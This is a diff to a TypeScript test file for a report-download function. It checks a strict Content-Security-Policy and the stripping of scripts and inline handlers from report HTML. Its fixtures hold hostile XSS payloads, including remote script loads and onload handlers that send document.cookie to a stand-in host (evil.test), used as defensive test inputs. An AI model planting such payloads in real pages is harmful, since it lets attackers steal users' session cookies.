@@ -6,6 +6,7 @@ import {
   printableFilename,
   whiteLabelFor,
 } from "./printableReport";
+import { REPORT_CSP } from "@/shared/report-sandbox";
 
 /**
  * The download artefact, and the white-label identity read out of the document.
@@ -208,41 +209,134 @@ describe("printableDocument", () => {
     expect(header).toContain(encodeURIComponent("Rapport-d-audit.html"));
   });
 
-  it("sends the print CSP, so the print script runs and the report's does not", async () => {
-    const response = printableDocument(UNTEMPLATED, "GEO audit", "r1");
+  it("sends the locked-down policy, because the file has no script", async () => {
+    const response = printableDocument(TEMPLATED, "t", "r1");
     const csp = response.headers.get("Content-Security-Policy") ?? "";
 
-    // **A download that ran the report's own scripts would be the sandbox bypass
-    // this system exists to prevent.** The hash is what keeps them blocked.
-    expect(csp).toContain("allow-scripts");
-    expect(csp).toMatch(/script-src 'sha256-[A-Za-z0-9+/=]+'/);
-    expect(csp).not.toContain("script-src 'unsafe-inline'");
+    // **Not the print policy.** The saved document is inert — every script is
+    // stripped — so `allow-scripts` here would authorise a script that is not
+    // there, and would be the one place the download is permissive if the
+    // stripping ever regressed.
+    expect(csp).toBe(REPORT_CSP);
+    expect(csp).not.toContain("allow-scripts");
+    // The report's own styles are allowed to be inline — `style-src
+    // 'unsafe-inline'` is in the base policy — but no script source is.
+    expect(csp).not.toContain("script-src");
   });
 
-  it("injects the print script so the dialog opens itself", async () => {
-    const response = printableDocument(UNTEMPLATED, "GEO audit", "r1");
-    const body = await response.text();
+  it("carries no script at all, because a download is never rendered", async () => {
+    const body = await printableDocument(TEMPLATED, "t", "r1").text();
 
-    // The same constant `?print=1` uses, so a download and a print cannot
-    // diverge in how they expand collapsed `<details>` or when they snapshot.
-    expect(body).toContain('addEventListener("load"');
-    expect(body.lastIndexOf("<script>")).toBeGreaterThan(
-      body.lastIndexOf("</body>") - 200,
+    // **CodeRabbit's finding, and the assertion that now pins the fix.** A download
+    // is not rendered, so a `print()` call in the saved file could never fire — it
+    // was dead code in the artefact and a live risk in it, because a file opened
+    // from disk arrives with no CSP to stop a script the report's own author wrote.
+    expect(body).not.toContain("<script");
+    expect(body).not.toContain("print()");
+  });
+
+  it("strips a script the report wrote for itself", async () => {
+    // The threat model: report HTML is written by a model from crawled pages, SERP
+    // titles and GSC queries — all attacker-influenceable. A client opening the
+    // file is executing whatever was in it.
+    const hostile = TEMPLATED.replace(
+      "</body>",
+      '<script src="https://evil.test/x.js"></script></body>',
+    );
+
+    const body = await printableDocument(hostile, "t", "r1").text();
+
+    expect(body).not.toContain("evil.test");
+    expect(body).not.toContain("<script");
+  });
+
+  it("strips a properly closed script, which only the first rule can stop", async () => {
+    // **The unterminated rule would pass this test too**, because
+    // `/<script\b[\s\S]*?$/` swallows everything from the tag to the end of the
+    // document. So this case is what makes the *closed* rule independently
+    // necessary — and the reason both rules exist rather than one covering for the
+    // other.
+    const hostile = TEMPLATED.replace(
+      "</body>",
+      '<script>fetch("https://evil.test/a")</script><p>after</p></body>',
+    );
+
+    const body = await printableDocument(hostile, "t", "r1").text();
+
+    expect(body).not.toContain("evil.test");
+    expect(body).not.toContain("<script");
+    // The content *after* the script has to survive, or stripping has become
+    // deleting the report.
+    expect(body).toContain("after");
+  });
+
+  it("strips a single-quoted inline handler as well as a double-quoted one", async () => {
+    // The rule existed and was never exercised, so a mutation removing it changed
+    // nothing. Both quoting styles are real: a model writing HTML writes either.
+    const hostile = TEMPLATED.replace(
+      "<body>",
+      // **A real single-quoted attribute**, not an escaped one: the rule matches
+      // `'[^']*'`, so the fixture has to contain an actual apostrophe-delimited
+      // value or the test would pass for the wrong reason.
+      `<body onload='fetch("https://evil.test/?c="+document.cookie)'>`,
+    );
+
+    const body = await printableDocument(hostile, "t", "r1").text();
+
+    expect(body).not.toContain("onload");
+    expect(body).not.toContain("evil.test");
+  });
+
+  it("strips an inline handler, which runs without a script element", async () => {
+    // `<script>` removal alone would leave this, and it executes on click.
+    const hostile = TEMPLATED.replace(
+      "<body>",
+      `<body onload="fetch('https://evil.test/?c='+document.cookie)">`,
+    );
+
+    const body = await printableDocument(hostile, "t", "r1").text();
+
+    expect(body).not.toContain("onload");
+    expect(body).not.toContain("evil.test");
+  });
+
+  it("strips an unterminated script, the shape a truncated document ends in", async () => {
+    const truncated =
+      '<html><head></head><body><p>partial</p><script src="https://evil.test/x.js"';
+
+    const body = await printableDocument(truncated, "t", "r1").text();
+
+    expect(body).not.toContain("evil.test");
+  });
+
+  it("carries a policy inside the file, because a header does not travel with it", async () => {
+    const body = await printableDocument(TEMPLATED, "t", "r1").text();
+
+    // **A `meta` CSP applies only to what follows it**, so it has to be first in
+    // `<head>` — a document whose first element is a script would have run it
+    // before the browser read the policy.
+    const head = /<head[^>]*>([\s\S]*?)<\/head>/i.exec(body)?.[1] ?? "";
+    expect(head.trimStart().startsWith("<meta http-equiv=")).toBe(true);
+    expect(head).toContain("Content-Security-Policy");
+    // The locked-down policy, not the print one: this document has no script to
+    // authorise, so `allow-scripts` would be granting nothing on purpose.
+    expect(head).not.toContain("allow-scripts");
+  });
+
+  it("puts the policy ahead of anything when the document has no head", async () => {
+    const headless = "<html><body><p>bare</p></body></html>";
+
+    const body = await printableDocument(headless, "t", "r1").text();
+
+    expect(body).toContain("<head><meta http-equiv=");
+    // Before the body, so nothing can precede the policy.
+    expect(body.indexOf("<meta http-equiv=")).toBeLessThan(
+      body.indexOf("<body"),
     );
   });
 
-  it("gives a dangling script tag nothing to absorb an attribute with", async () => {
-    // The splice does not parse a document we did not write. A report ending in
-    // `<script src="x" ` would absorb a nonce off our tag; ours carries none.
-    const hostile = "<html><body><script src=";
-    const body = await printableDocument(hostile, "t", "r1").text();
-
-    expect(body).toContain(`<script>addEventListener("load"`);
-    expect(body).not.toContain("'nonce-");
-  });
-
   it("never caches a document carrying a client's findings", async () => {
-    const response = printableDocument(UNTEMPLATED, "GEO audit", "r1");
+    const response = printableDocument(TEMPLATED, "t", "r1");
     expect(response.headers.get("Cache-Control")).toBe("private, no-store");
   });
 
